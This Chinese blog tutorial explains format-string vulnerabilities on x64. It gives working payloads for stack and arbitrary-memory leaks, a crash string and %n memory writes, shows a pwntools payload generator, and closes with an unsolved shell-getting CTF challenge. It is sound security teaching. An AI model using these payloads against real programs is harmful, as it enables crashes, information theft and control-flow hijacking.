---
title: 字符串格式化：一文说明如何利用字符串格式化漏洞来读写任意内存
pinned: true
description: 笔者将在此详细介绍字符串格式化漏洞。这是一个偏基础的文章。不过文章内提供的CTF题目还是有点难度的。
tags: [网络安全]
category: 技术
author: 雪纷飞
draft: false
# updated: 2026-10-10
published: 2026-01-25
image: "api"
---

# 格式化字符串漏洞原理

:::IMPORTANT
在阅读此文之前，务必确保您已经对**栈**、**x64函数调用约定**、**指针**、**C语言字符串**了如指掌。笔者将对它们分别进行简要回顾。
:::

## 基础回顾

我们使用小端序。

### 指针与C语言字符串

如果一个函数需要一个字符串作为参数，那么这个字符串一般都是通过**指针传递**的，指针指向字符串的首字符，用`'\0'`来表示字符串的终止。

:::NOTE
C++的`std::string`并不是这样。本文略去不讲。
:::

### x64函数调用约定与栈

假设有这样一个函数：

```c showLineNumbers=false
long long function(long long arg0, long long arg1, long long arg2, 
                   long long arg3, long long arg4, long long arg5, 
                   long long arg6, long long arg7, long long arg8);
```

那么，**参数`arg0`到`arg5`会分别被存放到`rdi`、`rsi`、`rdx`、`rcx`、`r8`、`r9`中，余下的参数依次压入栈中（从右到左）**。整个函数调用如下所示：
```asm
push arg8
push arg7
push arg6
mov  r9,  arg5
mov  r8,  arg4
mov  rcx, arg3
mov  rdx, arg2
mov  rsi, arg1
mov  rdi, arg0
call function
```

在`function`内部，栈大概长这么模样（局部变量仅做示意）：
```text
Low  Addr +-------------------------------+
rsp -0x10 |  QWORD local_variable;        |
    -0x08 |  QWORD __canary;              |
rbp  0x00 |  QWORD __saved_rbp;           |
    +0x08 |  QWORD *__return_address;     |
    +0x10 |  QWORD arg_6;                 |
    +0x18 |  QWORD arg_7;                 |
    +0x20 |  QWORD arg_8;                 |
High Addr +-------------------------------+
```

函数的返回值会被存储在`rax`中。

### printf

考虑下面一个简单的程序：

```c showLineNumbers=false wrap
char address[] = "Mr. White";
char name[]    = "Karl Kiehn";
int  born      = 1998;
printf("Hello %s, my name's %s, and I was born in %4d.", &address, &name, born);
```

:::NOTE
数组的地址就是数组的首元素的地址。
:::

有
```asm showLineNumbers=false
rdi = Some-Address         -> "Hello %s, my name's %s, and I was born in %4d."
rsi = Address-of-`address` -> "Mr. White"
rdx = Address-of-`name`    -> "Karl Kiehn"
rcx = 1998
```

`printf`会依次遍历`[rdi]`这个字符列表。如果不是`%`，那么直接输出到屏幕；如果是`%`，那么进行格式化：
+ `%%`得到`%`
+ `%s`将参数视作`char *`，对其解引用并输出到屏幕
+ `%d`直接将参数作为数字输出
+ `%p`将参数视为指针，以十六进制输出其指向的地址
+ ……
+ 更多的格式化序列请自行搜索

每次进行格式化后（`%%`除外），`printf`内置的计数器会+1，下一次格式化时就会调取下一个参数。

## 漏洞成因

对于x64程序，前6个参数都在寄存器内，没什么好说的。但自第7个参数开始，`printf`将直接**查找栈上的内容**。例如下面这个程序：
```c
void function()
{
    printf("%d %d %d %d %d %p", 0, 1, 2, 3, 4, 5);
}
```
前面五个`%d`会分别输出保存在寄存器内的数字0到5。而额外的`%p`将会输出栈上的首个数字，输出方式是作为地址输出。运行这个函数，在`printf`被调用之前`main`的上下文如下：
```text
<Reg>
    [rdi] = "%d %d %d %d %d %p"
    rsi  = 0
    rdx  = 1
    rcx  = 2
    r8   = 3
    r9   = 4

<Stack>
    Low  Addr +----------------------------------------+
    rsp -0x10 |  QWORD 0x5;                            |
        -0x08 |  QWORD __canary = 0xDEADBEEFCOFFEE00;  |
    rbp  0x00 |  QWORD __saved_regiters;               |
        +0x08 |  QWORD *__return_address;              |
    High Addr +----------------------------------------+
```
当其打印最后一个`%d`的时候，会查找栈上的首个参数，得到`0x5`。接着还有一个`%p`，`printf`会继续在栈上向下查找，得到`__canary`。因此如下内容会被输出：
```text showLineNumbers=false
0 1 2 3 4 5 0xDEADBEEFCOFFEE00
```

如果`printf(x)`中的`x`不是常量，而是可以被我们控制的量，那么我们可以**通过输入`%`来控制`printf`的行为**。就如上面的例子，多塞了一个`%p`，就泄露了栈上的数值。

这样是否太过麻烦了？倘若我要泄露的栈内存比较远，难道我还要在前面补上很多很多个`%d`才行吗？

# 漏洞利用：读

## 泄露栈上内容

事实上，C语言提供了下面的方法可以直接获取某个参数:
```c
printf("%1$s \n %3$d", "Hello", "FAKE", 10086);
/* Output:
Hello 
 10086
*/
```
即`%n$format`。**`n$`会直接取得第`n`个参数**！

:::IMPORTANT
从现在起，在计算参数的索引的时候，本文都**从0开始**计数。
:::

第1个参数是`"Hello"`，第3个参数是数字`10086`，因此输出如上。

:::NOTE
要求`n`是正整数。不能是0，更不可以是负数。
:::

对于下面这个函数（也就是上文的例子），传入`format`为`%7$p`就可以直接泄露canary：
```c
void function(char *format)
{
    printf(format, 0, 1, 2, 3, 4, 5);
}
```

## 泄露栈上指针

不同于`%d`、`%p`**直接读取参数并输出**，`%s`会读取参数，将其视作`char *`，然后**输出其所指向的字符串**。**由于是字符串，因此会被`\0`截断**。

:::NOTE
非法指针会直接**触发段错误**导致程序崩溃。因此，一般来说，下面这个payload能够稳定造成DoS：`%s%s%s%s%s%s%s%s%s%s……`。毕竟，栈上每一个变量都是合法指针的概率可并不高。
:::

## 泄露任意地址

上面我们的讨论都局限在栈上。那么有没有可能泄露任意地址呢？有的！

:::NOTE
不过也不能随便泄露啦……我们有要求：**`format`需要存储在栈上**。不过这个要求一般是能满足的——毕竟一般都是局部变量嘛。
:::

考虑下面一个简单的函数（不带canary）：
```c
int main()
{
    // canary disabled
    char input[16];
    scanf("%s", &input);
    printf(input);
}

```
反汇编如下：
```asm
   0x5149 <+0>:     push   rbp
   0x514a <+1>:     mov    rbp,rsp
   0x514d <+4>:     sub    rsp,0x10
   0x5151 <+8>:     lea    rax,[rbp-0x10]
   0x5155 <+12>:    lea    rdx,[rip+0xea8]        # 0x6004
   0x515c <+19>:    mov    rsi,rax
   0x515f <+22>:    mov    rdi,rdx
   0x5162 <+25>:    mov    eax,0x0
   0x5167 <+30>:    call   0x5040 <__isoc23_scanf@plt>
   0x516c <+35>:    lea    rax,[rbp-0x10]
   0x5170 <+39>:    mov    rdi,rax
   0x5173 <+42>:    mov    eax,0x0
=> 0x5178 <+47>:    call   0x5030 <printf@plt>
   0x517d <+52>:    mov    eax,0x0
   0x5182 <+57>:    leave
   0x5183 <+58>:    ret

```
如果我们输入`ABCD1234WXYZ`，那此时我们的栈就是：
```text showLineNumbers=false
00:0000│ rdi rsp 0x7fffffffde30 ◂— 0x3433323144434241  /* 'ABCD1234' */
01:0008│-008     0x7fffffffde38 ◂— 0x00007f005a595857  /* 'WXYZ' + '\x00\x7f\x00\x00' */
02:0010│ rbp     0x7fffffffde40 ◂— 1                   /* saved_rbp */
03:0018│+008     0x7fffffffde48 —▸ 0x7ffff7dd7ca8 ◂— mov edi, eax /* return_address */
```
我们输入的内容会被存放到栈上！工工整整！

:::TIP
注意是小端序哦。`'A' = 0x41`，`'1' = 0x31`，`'W' = 0x57`
:::

因此，如果我们输入`\x11\x22\x33\x44\xAA\xBB\xCC\xDD%6$s`，栈就会变成：

```text showLineNumbers=false
00:0000│ rdi rsp 0x7fffffffde30 ◂— 0xDDCCBBAA44332211  /* '0xDDCCBBAA44332211 */
01:0008│-008     0x7fffffffde38 ◂— 0x00007f0073243625  /* '%6$s' + '\x00\x7f\x00\x00' */
```

`printf`在格式化`%6$s`的时候，会访问第6个参数，我们熟知，第0到第5个参数分别是`rdi`、`rsi`、`rdx`、`rcx`、`r8`、`r9`，那么**第6个参数就是栈顶**——`0xDDCCBBAA44332211`。`%s`会要求`printf`将这个地址视作`char *`，并输出其指向的字符串。就此，我们实现了任意地址读。

:::NOTE
当然，我们**没有必要非得把地址放到`format`的开头**，例如，下面这个payload也能起到相同的效果：`AAAA%7$s\x11\x22\x33\x44\xAA\xBB\xCC\xDD`，在四个`A`后`printf`就会打印`0xDDCCBBAA44332211`指向的字符串。
:::

# 漏洞利用：写

有这么一个特殊的格式化序列：`%n`。其会将当前`printf`已经打印在屏幕上的字符数保存到给定的整形指针内。

例如：
```c
int num = 0;
char weather[] = "sunny";
char play[] = "football";
printf("It's %s now.%n Shall we play %s?\n", &weather, &num, &play);
printf("num is %d", num);

/* Output:
It's sunny now. Shall we play football?
num is 15
*/
```
> 原因：在`%n`之前，输出的`It's sunny now.`合计15个字符。

此外，`%hn`会写入到`short *`，`%hhn`会写入到`char *`。例如：

```c
unsigned int num = 0xFFFFFFFF;
printf("%hhn %43979d %hn\n", (char *)&num, 0, ((short *)&num) + 1);
printf("num is %p", num);

// 下面Output的第一行是43978个空格，然后后面尾随一个0。
// 0xabcd的十进制表示是43981。
/* Output:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           0 
num is 0xabcdff00  
*/
```
为什么会这样呢？我们来详细分析分析。

> - 首先，`printf`遭遇了`%hhn`。
>   + 现在输出了多少个字符：0个。
>   + 因此，把指针`(char *)&num`指向的变量修改为0。
>   + 这个指针指向`num`的末位`byte`。
>   + 故目前为止`num`变成了`0xFFFFFF00`。
> - 然后，`printf`遭遇了` `，那就输出一个空格。
> - 接着是`%43979d`，这个意思是输出一个占据43979个宽度的数字，如果宽度不够就在左侧用空格补齐。因此，输出了43978个空格，然后是数字0。
> - 接下来又是一个` `，那就再输出一个空格。
> - 最后是`$hn`，现在已经累计输出了`1 + 43979 + 1 = 43981 = 0xABCD`个字符，故需要把`((short *)&num) + 1`这个`short *`指针指向的内容修改为43981（即0xABCD）。`((short *)&num) + 1`指向的是`num`的高位，因此`num`变成了`0xABCDFF00`。

## 覆盖栈上内容

`%n`同样支持`%n$format`语法。因此模仿上文直接来就行了。

例如，考虑下面这个函数：
```c
int main()
{
    // 静态变量c并不存储在栈上
    static char c[16];
    scanf("%s", &c);
    printf(c);
}
```

在`call printf@plt`之前的一瞬间，栈的情况如下：
```text showLineNumbers=false
00:0000│ rbp rsp 0x7fffffffde40 ◂— 1
01:0008│+008     0x7fffffffde48 —▸ 0x7ffff7dd7ca8 ◂— mov edi, eax
02:0010│+010     0x7fffffffde50 —▸ 0x7fffffffdf40 —▸ 0x7fffffffdf48 ◂— 0x38 /* '8' */
```
我们只需要输入`%255d%8$n`，就能够把`0x7fffffffdf50`里面存储的指针`0x7fffffffdf40`的值从`0x7fffffffdf48`的变成`0x7fff000000ff`。如下：
```text showLineNumbers=false
00:0000│ rbp rsp 0x7fffffffde40 ◂— 1
01:0008│+008     0x7fffffffde48 —▸ 0x7ffff7dd7ca8 ◂— mov edi, eax
02:0010│+010     0x7fffffffde50 —▸ 0x7fffffffdf40 ◂— 0x7fff000000ff
```

## 覆盖任意地址

:::TIP
要求和[泄露任意地址](#泄露任意地址)的时候一样，`format`需要存储在栈上。
:::

原理和操作方法想必大家都清楚了，笔者不再缀述。但是，笔者得说一下**快速构造payload的方法**，毕竟每次都去手算的话还是挺麻烦的：

```py
from pwn import *  # pip install pwntools

context.arch = 'amd64'
payload = fmtstr_payload(
    offset = 6, # 寄存器参数的个数
                # 对于x64，共rdi rsi rdx rcx r8 r9六个
    writes = {  # 格式是address: target
        0x7ffff6142850: 0x1234567812345678,
        0x55769a384678: 0xdeadbeefcafebaad,
        0x7ffff6142860: p8(0xf2), # 可以只写入一个byte
        0x7ffff6142864: p16(0xabcd), # 可以只写入一个short，地址可以不是0x8的倍数
        0x7ffff6142878: p32(0xabcdbcda),
    },
    write_size = 'byte' # 逐字节覆盖，也可以选用short或int
                        # byte使用%hhn，short使用%hn，int使用%n
)
```

上面的python代码会生成一个payload，将所给的5个地址分别写入为所给的5个值。`fmtstr_payload`还有一些其他参数和选项，此处不过多叙述，有兴趣的读者可以查看`help(fmtstr_payload)`。

:::TIP[Tip：关于`write_size`]
对于一个较大的数，例如，把某个地址覆盖为`0x12345678`，如果想要一步到位，那么就得用`%305419896d%n`。这么长！因此，我们有更聪明的方案：**逐byte/逐short覆写**，例如，先把该地址的高位覆盖为`0x1234`，再把低位覆盖为`0x5678`，这样或许会好一些。

此外，有的时候我们也**不能接受必须覆写整个`int`**。例如，程序开启了PIE，并且我们不知道程序的基址。这个时候我们想通过字符串格式化漏洞来篡改栈中的return地址，就只能选择使用`byte`，覆写return地址的最后一个`byte`。
:::

# 题目：Seeuagain

题目的目标是获得shell。有兴趣的读者可以下载后自行完成。

## 下载地址

:::file
[点击下载 Seeuagain 题目附件][attachment.zip]
:::

## 提示

建议您先尝试完成题目后再阅读此节的内容。

```text ins="Full RELRO" ins="Canary found" ins="NX enabled" ins="PIE enabled" ins="Enabled" del="No"
$ checksec
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```
```c
void init()
{
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
}

unsigned __int64 backdoor()
{
  char buf[16]; // [rsp+0h] [rbp-1010h] BYREF
  unsigned __int64 v2; // [rsp+1008h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  read(0, buf, 0x300u);
  printf(buf);
  return v2 - __readfsqword(0x28u);
}

int __fastcall main(int argc, const char **argv, const char **envp)
{
  init();
  read(0, buff, 0x10u);
  printf(buff);
  if ( sayuagain )
    backdoor();
  else
    sayuagain = 1;
  return 0;
}
```
```asm
.bss:004049                 align 20h
.bss:004060                 public sayuagain
.bss:004060 sayuagain       dd ?                    ; DATA XREF: main+3F↑r
.bss:004060                                         ; main+49↑w
.bss:004064                 align 20h
.bss:004080                 public buff
.bss:004080 ; char buff[32]
.bss:004080 buff            db 20h dup(?)           ; DATA XREF: main+17↑o
.bss:004080                                         ; main+2B↑o
```
```asm
.init_array:003D98 ; ELF Initialization Function Table
.init_array:003D98 ; ===========================================================================
.init_array:003D98
.init_array:003D98 ; Segment type: Pure data
.init_array:003D98 ; Segment permissions: Read/Write
.init_array:003D98 _init_array     segment qword public 'DATA' use64
.init_array:003D98                 assume cs:_init_array
.init_array:003D98                 ;org 3D98h
.init_array:003D98 __frame_dummy_init_array_entry dq offset frame_dummy
.init_array:003D98                                         ; DATA XREF: LOAD:000168↑o
.init_array:003D98                                         ; LOAD:0002F0↑o
.init_array:003D98 _init_array     ends
.init_array:003D98
.fini_array:003DA0 ; ELF Termination Function Table
.fini_array:003DA0 ; ===========================================================================
.fini_array:003DA0
.fini_array:003DA0 ; Segment type: Pure data
.fini_array:003DA0 ; Segment permissions: Read/Write
.fini_array:003DA0 _fini_array     segment qword public 'DATA' use64
.fini_array:003DA0                 assume cs:_fini_array
.fini_array:003DA0                 ;org 3DA0h
.fini_array:003DA0 __do_global_dtors_aux_fini_array_entry dq offset __do_global_dtors_aux
.fini_array:003DA0 _fini_array     ends
.fini_array:003DA0
.data.rel.ro:003DA8 ; ===========================================================================
.data.rel.ro:003DA8
.data.rel.ro:003DA8 ; Segment type: Pure data
.data.rel.ro:003DA8 ; Segment permissions: Read/Write
.data.rel.ro:003DA8 _data_rel_ro    segment qword public 'DATA' use64
.data.rel.ro:003DA8                 assume cs:_data_rel_ro
.data.rel.ro:003DA8                 ;org 3DA8h
.data.rel.ro:003DA8                 public gift
.data.rel.ro:003DA8 gift            dq offset main
.data.rel.ro:003DA8 _data_rel_ro    ends
.data.rel.ro:003DA8
```
> 再度拜访main函数。

## 解答

~~文章的篇幅已经够长了，本题的分析和解答就等有空了再水一篇博客吧！~~

<!-- 引用 -->

[attachment.zip]: /assets/ctf/seeuagain.zip "题目Seeuagain下载"